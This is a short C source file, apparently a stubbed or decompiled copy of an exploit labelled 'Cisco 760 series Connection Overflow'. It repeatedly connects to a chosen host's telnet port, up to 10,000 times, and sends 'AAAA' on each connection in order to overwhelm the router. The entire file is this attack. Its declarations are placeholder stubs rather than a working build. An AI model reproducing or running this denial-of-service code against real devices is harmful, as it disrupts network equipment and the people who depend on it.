
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct sockaddr_in {int dummy; } ;


 int EXIT_FAILURE ;
 int EXIT_SUCCESS ;
 int atoi (char*) ;
 int exit (int ) ;
 int fflush (int ) ;
 int net_connect (struct sockaddr_in*,char*,int,int *,int ,int) ;
 int net_write (int,char*) ;
 int printf (char*,...) ;
 int stdout ;
 int strcpy (char*,char*) ;
 int usage () ;

int
main (int argc, char *argv[])
{


        char host[256];
        int port,times,count,sd = 0;
        int m = 0;
        struct sockaddr_in cs;


        printf ("Cisco 760 series Connection Overflow.\n");
        printf ("-------------------------------------\n");

        if (argc < 3)
        usage();

        strcpy (host, argv[1]);
        times=atoi (argv[2]);

        if ((times < 1) || (times > 10000))
                usage();



        port =23;



        printf ("Host: %s Times: %d\n", host, times);
        for (count=0;count<times;count++){
                printf ("Connecting... Connection number %d \n",count);
                fflush (stdout);
                sd = net_connect (&cs, host, port, ((void*)0), 0, 30);


                if (sd < 1) {
                        printf ("failed!\n");
                        exit (EXIT_FAILURE);
                        }



                net_write (sd, "AAAA\n\n");


        }


        exit (EXIT_SUCCESS);
}
